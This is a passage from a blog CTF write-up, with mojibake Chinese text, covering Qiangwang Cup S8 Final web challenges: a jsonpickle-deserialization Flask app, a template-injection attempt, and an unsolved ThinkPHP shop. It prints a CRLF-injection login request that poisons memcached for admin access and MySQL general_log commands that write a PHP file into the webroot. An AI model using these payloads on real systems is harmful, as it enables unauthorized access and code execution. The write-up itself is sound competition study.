            token <span class="token operator">=</span> Token<span class="token punctuation">(</span>username<span class="token punctuation">,</span> time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            res<span class="token punctuation">.</span>status_code <span class="token operator">=</span> <span class="token number">302</span>
            res<span class="token punctuation">.</span>set_cookie<span class="token punctuation">(</span><span class="token string">'token'</span><span class="token punctuation">,</span> base64<span class="token punctuation">.</span>urlsafe_b64encode<span class="token punctuation">(</span>jsonpickle<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            res<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Location'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'/home'</span>
            <span class="token keyword">return</span> res

    <span class="token keyword">return</span> <span class="token string">'Invalid credentials (guest/guest)'</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/home'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">home</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    token <span class="token operator">=</span> request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'token'</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> token<span class="token punctuation">:</span>
        jtoken <span class="token operator">=</span> base64<span class="token punctuation">.</span>urlsafe_b64decode<span class="token punctuation">(</span>token<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> waf<span class="token punctuation">(</span>jtoken<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token string">'Invalid token'</span>
        token <span class="token operator">=</span> jsonpickle<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>jtoken<span class="token punctuation">,</span> safe<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> token<span class="token punctuation">.</span>timestamp <span class="token operator">&lt;</span> <span class="token number">60</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> token<span class="token punctuation">.</span>username <span class="token operator">!=</span> <span class="token string">'admin'</span><span class="token punctuation">:</span>
                <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f'Welcome </span><span class="token interpolation"><span class="token punctuation">&#123;</span>token<span class="token punctuation">.</span>username<span class="token punctuation">&#125;</span></span><span class="token string">, but you are not admin'</span></span>
            <span class="token keyword">return</span> <span class="token string">'Welcome admin, there is something in /s3Cr3T'</span>
    <span class="token keyword">return</span> <span class="token string">'Invalid token'</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/s3Cr3T'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">secret</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    token <span class="token operator">=</span> request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'token'</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> token<span class="token punctuation">:</span>
        jtoken <span class="token operator">=</span> base64<span class="token punctuation">.</span>urlsafe_b64decode<span class="token punctuation">(</span>token<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> waf<span class="token punctuation">(</span>jtoken<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token string">'Invalid token'</span>
        token <span class="token operator">=</span> jsonpickle<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>jtoken<span class="token punctuation">,</span> safe<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> token<span class="token punctuation">.</span>timestamp <span class="token operator">&lt;</span> <span class="token number">60</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> token<span class="token punctuation">.</span>username <span class="token operator">!=</span> <span class="token string">'admin'</span><span class="token punctuation">:</span>
                <span class="token keyword">return</span> <span class="token string">'Invalid token'</span>
            <span class="token keyword">return</span> <span class="token triple-quoted-string string">'''
if not waf(token):
    return 'Invalid token'
token = jsonpickle.decode(token, safe=True)
if time() - token.timestamp &lt; 60:
    if token.username != 'admin':
        return f'Welcome &#123;token.username&#125;, but you are not admin'
    return 'Welcome admin, there is something in /s3Cr3T'
return 'Invalid token'
'''</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token string">'Invalid token'</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> <span class="token number">5000</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>åŒæ ·çš„æ–¹æ³•ç”¨ &#x2F;readflag è¯»å–flagå³å¯</p>
<hr>
<h2 id="anniversaryï¼ˆ0-Solvedï¼‰"><a href="#anniversaryï¼ˆ0-Solvedï¼‰" class="headerlink" title="anniversaryï¼ˆ0 Solvedï¼‰"></a>anniversaryï¼ˆ0 Solvedï¼‰</h2><p><img src="/blog/2024/12/05/%E5%BC%BA%E7%BD%91%E6%9D%AFS8-Final/image-20241206100717732.png" alt="image-20241206100717732"></p>
<p><img src="/blog/2024/12/05/%E5%BC%BA%E7%BD%91%E6%9D%AFS8-Final/image-20241206101144441.png" alt="image-20241206101144441"></p>
<p>è§‚å¯Ÿæ¸²æŸ“æ ¼å¼ï¼Œè¿™é‡Œæ˜¯<code>æ–¹æ³• å‚æ•°</code>çš„å½¢å¼</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token literal-property property">text</span><span class="token operator">:</span> <span class="token string">'è·ç¦»çºªå¿µæ—¥è¿˜æœ‰ &#123;&#123;anniversary_time_diff t=1736006400000 l=\"cn\"&#125;&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>æµ‹è¯•æŠ¥é”™ï¼š</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">Error<span class="token punctuation">:</span> Invalid time value

TypeError<span class="token punctuation">:</span> Cannot destructure <span class="token builtin">property</span> <span class="token string">'hash'</span> of <span class="token string">'arguments[0]'</span> <span class="token keyword">as</span> it <span class="token keyword">is</span> undefined<span class="token punctuation">.</span>
TypeError<span class="token punctuation">:</span> Cannot destructure <span class="token builtin">property</span> <span class="token string">'t'</span> of <span class="token string">'hash'</span> <span class="token keyword">as</span> it <span class="token keyword">is</span> undefined<span class="token punctuation">.</span>

RangeError<span class="token punctuation">:</span> Invalid time value<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>hintï¼š</p>
<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">æç¤ºï¼š
1. å°è¯•æ¢æµ‹æœåŠ¡ç«¯æ¸²æŸ“æ¨¡ç‰ˆçš„ç»„ä»¶åŠå…¶ç‰ˆæœ¬
2. anniversary_time_diffæ— æ³•åˆ©ç”¨
3. å°è¯•å‘ç°å…¶ä»–æ¨¡ç‰ˆå¯ä»¥è®¿é—®çš„å‡½æ•°/å˜é‡
4. å°è¯•åˆ©ç”¨æ¨¡ç‰ˆæ¸²æŸ“ç»„ä»¶æœ¬èº«çš„æ¼æ´å®ç°RCE
5. å°è¯•ç±»å‹æ··æ·†<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æµ‹ä¸å‡ºæ¥ï¼Œä»€ä¹ˆnodejsæ¨¡æ¿ä¼šåªæ¸²æŸ“<code>&#123;&#123;&#125;&#125;</code>ï¼Œ<code>[]</code>èƒ½è¿”å›ä¸€ä¸ª object å•Š</p>
<br>

<p>å¯èƒ½çš„æ¨¡æ¿ï¼š</p>
<p>Handlebarsï¼š<a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/4327">https://xz.aliyun.com/news/4327</a></p>
<hr>
<h1 id="RW"><a href="#RW" class="headerlink" title="RW"></a>RW</h1><h2 id="TS-ï¼ˆUnsolvedï¼‰"><a href="#TS-ï¼ˆUnsolvedï¼‰" class="headerlink" title="TS++ï¼ˆUnsolvedï¼‰"></a>TS++ï¼ˆUnsolvedï¼‰</h2><p>thinkshop è¿˜åœ¨è¿½æˆ‘</p>
<p>å’Œ thinkshopping ä¸€æ ·çš„æ“ä½œæ‰“ memcached è¿›åå°</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/public/index.php/index/admin/do_login.html</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">localhost:36000</span></span>
<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0</span></span>
<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate, br</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
<span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">PHPSESSID=gan31bc5bm4k4jn9v7npb878g6</span></span>
<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span>
<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">255</span></span>

username=admin%00%0D%0Aset%20think%3Ashop.admin%7Cadmin%204%20500%20101%0D%0Aa%3A3%3A%7Bs%3A2%3A%22id%22%3Bi%3A1%3Bs%3A8%3A%22username%22%3Bs%3A5%3A%22admin%22%3Bs%3A8%3A%22password%22%3Bs%3A32%3A%2221232f297a57a5a743894a0e4a801fc3%22%3B%7D&amp;password=admin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>è¿™æ ·å­è´¦å¯† admin:admin è¿›åå°</p>
<p>ä½†æ˜¯ secure_file_priv ä¸º <code>/var/lib/mysql-files/</code>ï¼Œä¸èƒ½è¯»æ–‡ä»¶äº†</p>
<p>æ€»ä¹‹ diff çœ‹ä¸€ä¸‹å’Œä¸Šä¸€ä»£æ¯”æœ‰å“ªäº›å˜åŒ–å§</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">diff</span> <span class="token parameter variable">-rq</span> web1 web2
Files web1/application/index/model/Goods.php and web2/application/index/model/Goods.php differ
Files web1/application/index/view/admin/goods_add.html and web2/application/index/view/admin/goods_add.html differ
Files web1/application/index/view/admin/goods_edit.html and web2/application/index/view/admin/goods_edit.html differ
Files web1/application/index/view/index/goods.html and web2/application/index/view/index/goods.html differ<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å¯¹æ¯”äº†ä¸€ä¸‹ï¼Œgoods_edit.html å’Œ goods.html é‡Œå¤šäº†ä¸ª base64 è§£ç ï¼ŒGoods.php åˆ æ‰äº†åé¢ä¸€ä¸²ç”¨ä¸ä¸Šçš„ä»£ç </p>
<p>sql é‡Œä»æœ‰<code>(1, &#39;admin&#39;, &#39;e10adc3949ba59abbe56e057f20f883e&#39;);</code>ï¼Œä¹Ÿå°±æ˜¯è¯´å¯ä»¥<code>1:123456</code>è¿›åå°</p>
<p>é‚£ä¹ˆå”¯ä¸€çš„é—®é¢˜å°±æ˜¯æˆ‘ä»¬ç°åœ¨åªæœ‰sqlæ³¨å…¥ï¼Œå†™ä¸äº†shell</p>
<p>æ„Ÿè§‰è¿˜æ˜¯è¦ä» memcached CRLF å…¥æ‰‹</p>
<p>å°è¯•å†™æ—¥å¿—</p>
<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">show variables like &#39;%general%&#39;;
set global general_log &#x3D; on;
set global general_log_file &#x3D; &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;public&#x2F;info.php&#39;;
select &#39;&lt;?php phpinfo();?&gt;&#39;;	<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>æœ¬åœ°å®¹å™¨ç»ˆç«¯ä¸Šæµ‹è¯•èƒ½å†™ï¼Œä½†æ˜¯æƒé™ä¸å¤Ÿè®¿é—®ï¼Œé‚æ”¾å¼ƒæ³¨å…¥</p>
<p>æœ€åæƒ³äº†ä¸‹ï¼Œæ—¢ç„¶æˆ‘ä»¬èƒ½å¾€ memcached é‡Œé¢å†™å…¥åºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆä¹Ÿå¯ä»¥ç›´æ¥æŠŠ poc çš„åºåˆ—åŒ–å­—ç¬¦ä¸²è¿›è¡Œååºåˆ—åŒ–</p>
<p>ç„¶åå°±æœåˆ°äº†è¿™ä¸ªï¼š<a target="_blank" rel="noopener" href="https://zhcy2018.github.io/2023/%E5%BC%BA%E7%BD%91%E6%9D%AF%20thinkshopping.html">https://zhcy2018.github.io/2023/%E5%BC%BA%E7%BD%91%E6%9D%AF%20thinkshopping.html</a></p>
<p>ä½†æ˜¯æ¥ä¸åŠäº†ï¼Œæ²¡æ¥å¾—åŠå¤šç ”ç©¶å°±æ¶ä¸Šå°å»å°è¯•äº†ï¼Œç„¶åç¿»è½¦äº†XD</p>
<hr>
<h1 id="æ¸¸è®°ï¼ˆto-be-continuedï¼‰"><a href="#æ¸¸è®°ï¼ˆto-be-continuedï¼‰" class="headerlink" title="æ¸¸è®°ï¼ˆto be continuedï¼‰"></a>æ¸¸è®°ï¼ˆto be continuedï¼‰</h1><p>ä¸‰å¤©çš„å¼ºç½‘æ¢¦ç»“æŸäº†ï¼Œå½’æ¥ä¾æ—§æ˜¯ä¸ªè‡­åŒéçš„å­¦ç”Ÿï¼Œå†™ä¸ªé”¤å­æ¸¸è®°ï¼Œddlèµ¶ä¸å®Œäº†ï¼Œç­‰è‚å®Œddlå†è¯´ â€”â€” 2024.12.8</p>

    </div>
    
    
    
    
    
    
    
</div>

            </div>
        </transition>
        
        <transition name="fade">
            <div id="preview" ref="preview" v-show="previewShow">
                <img id="preview-content" ref="previewContent" />
            </div>
        </transition>
        
    </div>
    <script src="/blog/js/main.js"></script>
    
    




    
    

<div id="vcomments"></div>

<script src="/blog/js/lib/valine.min.js"></script>
<script>
    new Valine({
        el: '#vcomments',
        app_id: 'U9mZLKunkRUTcBFthjXPjnZE-9Nh9j0Va',
        app_key: 'SzWOnY0PWLGNuL6jW8TZYc7j',
        visitor: 'true',
        placeholder: 'å†™ç‚¹ä»€ä¹ˆå§(â—Ë‡âˆ€Ë‡â—)',
        serverURLs: 'https://u9mzlkun.lc-cn-n1-shared.com',
    });
</script>

    <footer id="footer">
    <div id="footer-wrap">
        <div>
            &copy;
            2022 - 2025 é›²æµã®Lowest World
            <span id="footer-icon">
                <i class="fa-solid fa-font-awesome fa-fw"></i>
            </span>
            &commat;C1oudfL0w0
        </div>
        <div>
            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
            <a target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a>
        </div>
        
    </div>
</footer>

<script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/blog/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":290},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>

</html>